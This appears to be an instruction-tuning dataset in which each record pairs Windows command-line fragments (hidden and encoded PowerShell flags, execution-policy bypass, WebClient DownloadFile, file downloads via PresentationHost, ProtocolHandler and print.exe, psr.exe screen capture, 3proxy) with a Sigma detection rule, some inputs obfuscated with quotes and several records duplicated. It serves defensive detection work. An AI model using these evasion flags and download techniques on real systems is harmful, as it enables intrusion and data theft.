{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe -windowstyle h -windowstyl h -windowsty h -windowst h -windows h -windo h -wind h -win h -wi h -win h -win hi -win hid -win hidd -win hidde -NoPr -NoPro -NoProf -NoProfi -NoProfil -nonin -nonint -noninte -noninter -nonintera -noninterac -noninteract -noninteracti -noninteractiv -ec -encodedComman -encodedComma -encodedComm -encodedCom -encodedCo -encodedC -encoded -encode -encod -enco -en -executionpolic -executionpoli -executionpol -executionpo -executionp -execution bypass -executio bypass -executi bypass -execut bypass -execu bypass -exec bypass -exe bypass -ex bypass -ep bypass /windowstyle h /windowstyl h /windowsty h /windowst h /windows h /windo h /wind h /win h /wi h /win h /win hi /win hid /win hidd /win hidde /NoPr /NoPro /NoProf /NoProfi /NoProfil /nonin /nonint /noninte /noninter /nonintera /noninterac /noninteract /noninteracti /noninteractiv /ec /encodedComman /encodedComma /encodedComm /encodedCom /encodedCo /encodedC /encoded /encode /encod /enco /en /executionpolic /executionpoli /executionpol /executionpo /executionp /execution bypass /executio bypass /executi bypass /execut bypass /execu bypass /exec bypass /exe bypass /ex bypass /ep bypass", "output": "title: Suspicious PowerShell Parameter Substring\nid: 36210e0d-5b19-485d-a087-c096088885f0\nstatus: test\ndescription: Detects suspicious PowerShell invocation with a parameter substring\nreferences:\n    - http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier\nauthor: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)\ndate: 2019-01-16\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' -windowstyle h '\n            - ' -windowstyl h'\n            - ' -windowsty h'\n            - ' -windowst h'\n            - ' -windows h'\n            - ' -windo h'\n            - ' -wind h'\n            - ' -win h'\n            - ' -wi h'\n            - ' -win h '\n            - ' -win hi '\n            - ' -win hid '\n            - ' -win hidd '\n            - ' -win hidde '\n            - ' -NoPr '\n            - ' -NoPro '\n            - ' -NoProf '\n            - ' -NoProfi '\n            - ' -NoProfil '\n            - ' -nonin '\n            - ' -nonint '\n            - ' -noninte '\n            - ' -noninter '\n            - ' -nonintera '\n            - ' -noninterac '\n            - ' -noninteract '\n            - ' -noninteracti '\n            - ' -noninteractiv '\n            - ' -ec '\n            - ' -encodedComman '\n            - ' -encodedComma '\n            - ' -encodedComm '\n            - ' -encodedCom '\n            - ' -encodedCo '\n            - ' -encodedC '\n            - ' -encoded '\n            - ' -encode '\n            - ' -encod '\n            - ' -enco '\n            - ' -en '\n            - ' -executionpolic '\n            - ' -executionpoli '\n            - ' -executionpol '\n            - ' -executionpo '\n            - ' -executionp '\n            - ' -execution bypass'\n            - ' -executio bypass'\n            - ' -executi bypass'\n            - ' -execut bypass'\n            - ' -execu bypass'\n            - ' -exec bypass'\n            - ' -exe bypass'\n            - ' -ex bypass'\n            - ' -ep bypass'\n            - ' /windowstyle h '\n            - ' /windowstyl h'\n            - ' /windowsty h'\n            - ' /windowst h'\n            - ' /windows h'\n            - ' /windo h'\n            - ' /wind h'\n            - ' /win h'\n            - ' /wi h'\n            - ' /win h '\n            - ' /win hi '\n            - ' /win hid '\n            - ' /win hidd '\n            - ' /win hidde '\n            - ' /NoPr '\n            - ' /NoPro '\n            - ' /NoProf '\n            - ' /NoProfi '\n            - ' /NoProfil '\n            - ' /nonin '\n            - ' /nonint '\n            - ' /noninte '\n            - ' /noninter '\n            - ' /nonintera '\n            - ' /noninterac '\n            - ' /noninteract '\n            - ' /noninteracti '\n            - ' /noninteractiv '\n            - ' /ec '\n            - ' /encodedComman '\n            - ' /encodedComma '\n            - ' /encodedComm '\n            - ' /encodedCom '\n            - ' /encodedCo '\n            - ' /encodedC '\n            - ' /encoded '\n            - ' /encode '\n            - ' /encod '\n            - ' /enco '\n            - ' /en '\n            - ' /executionpolic '\n            - ' /executionpoli '\n            - ' /executionpol '\n            - ' /executionpo '\n            - ' /executionp '\n            - ' /execution bypass'\n            - ' /executio bypass'\n            - ' /executi bypass'\n            - ' /execut bypass'\n            - ' /execu bypass'\n            - ' /exec bypass'\n            - ' /exe bypass'\n            - ' /ex bypass'\n            - ' /ep bypass'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "powershell .DownloadFile System.Net.WebClient", "output": "title: PowerShell DownloadFile\nid: 8f70ac5f-1f6f-4f8e-b454-db19561216c5\nstatus: test\ndescription: Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-08-28\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.command-and-control\n    - attack.t1104\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'powershell'\n            - '.DownloadFile'\n            - 'System.Net.WebClient'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "powershell \\\".DownloadFile\\\" System.Net.WebClient", "output": "title: PowerShell DownloadFile\nid: 8f70ac5f-1f6f-4f8e-b454-db19561216c5\nstatus: test\ndescription: Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-08-28\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.command-and-control\n    - attack.t1104\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'powershell'\n            - '.DownloadFile'\n            - 'System.Net.WebClient'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "powershell .DownloadFile System.Net.WebClient", "output": "title: PowerShell DownloadFile\nid: 8f70ac5f-1f6f-4f8e-b454-db19561216c5\nstatus: test\ndescription: Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-08-28\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.command-and-control\n    - attack.t1104\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'powershell'\n            - '.DownloadFile'\n            - 'System.Net.WebClient'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "X509Enrollment.CBinaryConverter 884e2002-217d-11da-b2a4-000e7bbb2b09", "output": "title: Suspicious X509Enrollment - Process Creation\nid: 114de787-4eb2-48cc-abdb-c0b449f93ea4\nrelated:\n    - id: 504d63cb-0dba-4d02-8531-e72981aace2c\n      type: similar\nstatus: test\ndescription: Detect use of X509Enrollment\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=42\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=41\n    - https://learn.microsoft.com/en-us/dotnet/api/microsoft.hpc.scheduler.store.cx509enrollmentwebclassfactoryclass?view=hpc-sdk-5.1.6115\nauthor: frack113\ndate: 2022-12-23\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'X509Enrollment.CBinaryConverter'\n            - '884e2002-217d-11da-b2a4-000e7bbb2b09'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "X509Enrollment.CBinaryConverter \\\"8\\\"\\\"8\\\"\\\"4\\\"\\\"e\\\"\\\"2\\\"\\\"0\\\"\\\"0\\\"\\\"2\\\"\\\"-\\\"\\\"2\\\"\\\"1\\\"\\\"7\\\"\\\"d\\\"\\\"-\\\"\\\"1\\\"\\\"1\\\"\\\"d\\\"\\\"a\\\"\\\"-\\\"\\\"b\\\"\\\"2\\\"\\\"a\\\"\\\"4\\\"\\\"-\\\"\\\"0\\\"\\\"0\\\"\\\"0\\\"\\\"e\\\"\\\"7\\\"\\\"b\\\"\\\"b\\\"\\\"b\\\"\\\"2\\\"\\\"b\\\"\\\"0\\\"\\\"9\\\"", "output": "title: Suspicious X509Enrollment - Process Creation\nid: 114de787-4eb2-48cc-abdb-c0b449f93ea4\nrelated:\n    - id: 504d63cb-0dba-4d02-8531-e72981aace2c\n      type: similar\nstatus: test\ndescription: Detect use of X509Enrollment\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=42\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=41\n    - https://learn.microsoft.com/en-us/dotnet/api/microsoft.hpc.scheduler.store.cx509enrollmentwebclassfactoryclass?view=hpc-sdk-5.1.6115\nauthor: frack113\ndate: 2022-12-23\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'X509Enrollment.CBinaryConverter'\n            - '884e2002-217d-11da-b2a4-000e7bbb2b09'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "X509Enrollment.CBinaryConverter 884e2002-217d-11da-b2a4-000e7bbb2b09", "output": "title: Suspicious X509Enrollment - Process Creation\nid: 114de787-4eb2-48cc-abdb-c0b449f93ea4\nrelated:\n    - id: 504d63cb-0dba-4d02-8531-e72981aace2c\n      type: similar\nstatus: test\ndescription: Detect use of X509Enrollment\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=42\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=41\n    - https://learn.microsoft.com/en-us/dotnet/api/microsoft.hpc.scheduler.store.cx509enrollmentwebclassfactoryclass?view=hpc-sdk-5.1.6115\nauthor: frack113\ndate: 2022-12-23\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'X509Enrollment.CBinaryConverter'\n            - '884e2002-217d-11da-b2a4-000e7bbb2b09'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\presentationhost.exe PresentationHost.exe http:// https:// ftp://", "output": "title: Arbitrary File Download Via PresentationHost.EXE\nid: b124ddf4-778d-418e-907f-6dd3fc0d31cd\nstatus: test\ndescription: Detects usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/239/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\presentationhost.exe'\n        - OriginalFileName: 'PresentationHost.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - 'ftp://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\presentationhost.exe \"Presentati\"onHost.exe http:// https:// ftp://", "output": "title: Arbitrary File Download Via PresentationHost.EXE\nid: b124ddf4-778d-418e-907f-6dd3fc0d31cd\nstatus: test\ndescription: Detects usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/239/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\presentationhost.exe'\n        - OriginalFileName: 'PresentationHost.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - 'ftp://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\presentationhost PresentationHost http:// https:// ftp://", "output": "title: Arbitrary File Download Via PresentationHost.EXE\nid: b124ddf4-778d-418e-907f-6dd3fc0d31cd\nstatus: test\ndescription: Detects usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/239/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\presentationhost.exe'\n        - OriginalFileName: 'PresentationHost.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - 'ftp://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\presentationhost.exe https:// http:// ftp:// PresentationHost.exe", "output": "title: Arbitrary File Download Via PresentationHost.EXE\nid: b124ddf4-778d-418e-907f-6dd3fc0d31cd\nstatus: test\ndescription: Detects usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files to download arbitrary files\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/239/files\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\presentationhost.exe'\n        - OriginalFileName: 'PresentationHost.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - 'ftp://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\print.exe /D .exe print.exe", "output": "title: Abusing Print Executable\nid: bafac3d6-7de9-4dd9-8874-4a1194b493ed\nstatus: test\ndescription: Attackers can use print.exe for remote file copy\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Print/\n    - https://twitter.com/Oddvarmoe/status/985518877076541440\nauthor: 'Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative'\ndate: 2020-10-05\nmodified: 2022-07-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\print.exe'\n        CommandLine|startswith: 'print'\n        CommandLine|contains|all:\n            - '/D'\n            - '.exe'\n    filter_print:\n        CommandLine|contains: 'print.exe'\n    condition: selection and not filter_print\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\print.exe /D \".exe\" \"print.exe\"", "output": "title: Abusing Print Executable\nid: bafac3d6-7de9-4dd9-8874-4a1194b493ed\nstatus: test\ndescription: Attackers can use print.exe for remote file copy\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Print/\n    - https://twitter.com/Oddvarmoe/status/985518877076541440\nauthor: 'Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative'\ndate: 2020-10-05\nmodified: 2022-07-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\print.exe'\n        CommandLine|startswith: 'print'\n        CommandLine|contains|all:\n            - '/D'\n            - '.exe'\n    filter_print:\n        CommandLine|contains: 'print.exe'\n    condition: selection and not filter_print\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\print /D print", "output": "title: Abusing Print Executable\nid: bafac3d6-7de9-4dd9-8874-4a1194b493ed\nstatus: test\ndescription: Attackers can use print.exe for remote file copy\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Print/\n    - https://twitter.com/Oddvarmoe/status/985518877076541440\nauthor: 'Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative'\ndate: 2020-10-05\nmodified: 2022-07-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\print.exe'\n        CommandLine|startswith: 'print'\n        CommandLine|contains|all:\n            - '/D'\n            - '.exe'\n    filter_print:\n        CommandLine|contains: 'print.exe'\n    condition: selection and not filter_print\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\print.exe /D .exe print.exe", "output": "title: Abusing Print Executable\nid: bafac3d6-7de9-4dd9-8874-4a1194b493ed\nstatus: test\ndescription: Attackers can use print.exe for remote file copy\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Print/\n    - https://twitter.com/Oddvarmoe/status/985518877076541440\nauthor: 'Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative'\ndate: 2020-10-05\nmodified: 2022-07-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\print.exe'\n        CommandLine|startswith: 'print'\n        CommandLine|contains|all:\n            - '/D'\n            - '.exe'\n    filter_print:\n        CommandLine|contains: 'print.exe'\n    condition: selection and not filter_print\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\protocolhandler.exe ProtocolHandler.exe ftp:// http:// https://", "output": "title: File Download Using ProtocolHandler.exe\nid: 104cdb48-a7a8-4ca7-a453-32942c6e5dcb\nstatus: test\ndescription: |\n    Detects usage of \"ProtocolHandler\" to download files. Downloaded files will be located in the cache folder (for example - %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/ProtocolHandler/\nauthor: frack113\ndate: 2021-07-13\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\protocolhandler.exe'\n        - OriginalFileName: 'ProtocolHandler.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\protocolhandler.exe ProtocolHandler.exe ftp:// http:// \"http\"s://", "output": "title: File Download Using ProtocolHandler.exe\nid: 104cdb48-a7a8-4ca7-a453-32942c6e5dcb\nstatus: test\ndescription: |\n    Detects usage of \"ProtocolHandler\" to download files. Downloaded files will be located in the cache folder (for example - %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/ProtocolHandler/\nauthor: frack113\ndate: 2021-07-13\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\protocolhandler.exe'\n        - OriginalFileName: 'ProtocolHandler.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\protocolhandler ProtocolHandler ftp:// http:// https://", "output": "title: File Download Using ProtocolHandler.exe\nid: 104cdb48-a7a8-4ca7-a453-32942c6e5dcb\nstatus: test\ndescription: |\n    Detects usage of \"ProtocolHandler\" to download files. Downloaded files will be located in the cache folder (for example - %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/ProtocolHandler/\nauthor: frack113\ndate: 2021-07-13\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\protocolhandler.exe'\n        - OriginalFileName: 'ProtocolHandler.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\protocolhandler.exe https:// ProtocolHandler.exe http:// ftp://", "output": "title: File Download Using ProtocolHandler.exe\nid: 104cdb48-a7a8-4ca7-a453-32942c6e5dcb\nstatus: test\ndescription: |\n    Detects usage of \"ProtocolHandler\" to download files. Downloaded files will be located in the cache folder (for example - %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/ProtocolHandler/\nauthor: frack113\ndate: 2021-07-13\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\protocolhandler.exe'\n        - OriginalFileName: 'ProtocolHandler.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'ftp://'\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Psr.exe /start -start", "output": "title: Screen Capture Activity Via Psr.EXE\nid: 2158f96f-43c2-43cb-952a-ab4580f32382\nstatus: test\ndescription: Detects execution of Windows Problem Steps Recorder (psr.exe), a utility used to record the user screen and clicks.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Psr/\n    - https://web.archive.org/web/20200229201156/https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493861893.pdf\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Beyu Denis, oscd.community\ndate: 2019-10-12\nmodified: 2024-01-04\ntags:\n    - attack.collection\n    - attack.t1113\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Psr.exe'\n        CommandLine|contains:\n            - '/start'\n            - '-start'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Psr.exe /start -st\"art\"", "output": "title: Screen Capture Activity Via Psr.EXE\nid: 2158f96f-43c2-43cb-952a-ab4580f32382\nstatus: test\ndescription: Detects execution of Windows Problem Steps Recorder (psr.exe), a utility used to record the user screen and clicks.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Psr/\n    - https://web.archive.org/web/20200229201156/https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493861893.pdf\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Beyu Denis, oscd.community\ndate: 2019-10-12\nmodified: 2024-01-04\ntags:\n    - attack.collection\n    - attack.t1113\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Psr.exe'\n        CommandLine|contains:\n            - '/start'\n            - '-start'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Psr /start -start", "output": "title: Screen Capture Activity Via Psr.EXE\nid: 2158f96f-43c2-43cb-952a-ab4580f32382\nstatus: test\ndescription: Detects execution of Windows Problem Steps Recorder (psr.exe), a utility used to record the user screen and clicks.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Psr/\n    - https://web.archive.org/web/20200229201156/https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493861893.pdf\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Beyu Denis, oscd.community\ndate: 2019-10-12\nmodified: 2024-01-04\ntags:\n    - attack.collection\n    - attack.t1113\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Psr.exe'\n        CommandLine|contains:\n            - '/start'\n            - '-start'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Psr.exe /start -start", "output": "title: Screen Capture Activity Via Psr.EXE\nid: 2158f96f-43c2-43cb-952a-ab4580f32382\nstatus: test\ndescription: Detects execution of Windows Problem Steps Recorder (psr.exe), a utility used to record the user screen and clicks.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Psr/\n    - https://web.archive.org/web/20200229201156/https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493861893.pdf\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Beyu Denis, oscd.community\ndate: 2019-10-12\nmodified: 2024-01-04\ntags:\n    - attack.collection\n    - attack.t1113\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Psr.exe'\n        CommandLine|contains:\n            - '/start'\n            - '-start'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\3proxy.exe .exe -i127.0.0.1 -p", "output": "title: PUA - 3Proxy Execution\nid: f38a82d2-fba3-4781-b549-525efbec8506\nstatus: test\ndescription: Detects the use of 3proxy, a tiny free proxy server\nreferences:\n    - https://github.com/3proxy/3proxy\n    - https://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-13\nmodified: 2023-02-21\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\3proxy.exe'\n    selection_pe:\n        Description: '3proxy - tiny proxy server'\n    selection_params: # param combos seen in the wild\n        CommandLine|contains: '.exe -i127.0.0.1 -p'\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\3proxy.exe .e\"xe\" -i127.0.0.1 -p", "output": "title: PUA - 3Proxy Execution\nid: f38a82d2-fba3-4781-b549-525efbec8506\nstatus: test\ndescription: Detects the use of 3proxy, a tiny free proxy server\nreferences:\n    - https://github.com/3proxy/3proxy\n    - https://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-13\nmodified: 2023-02-21\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\3proxy.exe'\n    selection_pe:\n        Description: '3proxy - tiny proxy server'\n    selection_params: # param combos seen in the wild\n        CommandLine|contains: '.exe -i127.0.0.1 -p'\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\3proxy -i127.0.0.1 -p", "output": "title: PUA - 3Proxy Execution\nid: f38a82d2-fba3-4781-b549-525efbec8506\nstatus: test\ndescription: Detects the use of 3proxy, a tiny free proxy server\nreferences:\n    - https://github.com/3proxy/3proxy\n    - https://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-13\nmodified: 2023-02-21\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\3proxy.exe'\n    selection_pe:\n        Description: '3proxy - tiny proxy server'\n    selection_params: # param combos seen in the wild\n        CommandLine|contains: '.exe -i127.0.0.1 -p'\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
